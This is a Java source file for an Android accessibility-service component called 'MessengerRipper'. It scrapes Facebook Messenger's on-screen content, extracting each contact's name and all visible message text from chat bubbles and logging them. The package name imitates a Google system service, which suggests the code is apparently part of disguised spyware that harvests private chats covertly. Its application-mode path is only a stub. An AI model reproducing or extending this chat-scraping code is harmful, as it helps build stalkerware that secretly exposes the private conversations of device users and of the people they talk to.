package service.android.google.com.accessibility.util.ripper.rippers;

import android.view.accessibility.AccessibilityNodeInfo;

import java.util.List;

import service.android.google.com.accessibility.model.ChatEvent;
import timber.log.Timber;

/**
 * Ripper for Messenger.
 * https://play.google.com/store/apps/details?id=com.facebook.orca
 */
public class MessengerRipper extends AbstractWindowRipper {

    public MessengerRipper() {
        super("com.facebook.orca");
    }

    @Override
    public ChatEvent getWindowInfoEventFromAccessibilityNodeInfo(AccessibilityNodeInfo nodeInfo) {
        ChatEvent.Builder builder = ChatEvent.builder();
        builder.packageName(nodeInfo.getPackageName().toString());
        List<AccessibilityNodeInfo> thread_tile_img = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResourceID("thread_tile_img"));
        if (thread_tile_img.size() >= 1) {
            return ripInBubbleMode(builder, nodeInfo);
        } else {
            return ripInApplicationMode(builder, nodeInfo);
        }
    }

    private ChatEvent ripInBubbleMode(final ChatEvent.Builder unfinishedBuilder, final AccessibilityNodeInfo nodeInfo) {
        final List<AccessibilityNodeInfo> thread_title_name = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResourceID("thread_title_name"));
        final List<AccessibilityNodeInfo> message_text_containers = nodeInfo.findAccessibilityNodeInfosByViewId(getFQResourceID("message_text"));

        if (thread_title_name.size() < 1 || message_text_containers.size() < 1) {
            return null;
        }

        //Contact name
        final String contactName = thread_title_name.get(0).getContentDescription().toString();
        unfinishedBuilder.contactName(contactName);

        //messages
        String messages = "";
        for (AccessibilityNodeInfo message : message_text_containers) {
            messages = messages + message.getText().toString();
        }
        unfinishedBuilder.messages(messages);

        String message_string = contactName + ": " + messages;
        Timber.d(message_string);

        return unfinishedBuilder.build();
    }

    private ChatEvent ripInApplicationMode(final ChatEvent.Builder unfinishedBuilder, final AccessibilityNodeInfo nodeInfo) {
        return null;
    }
}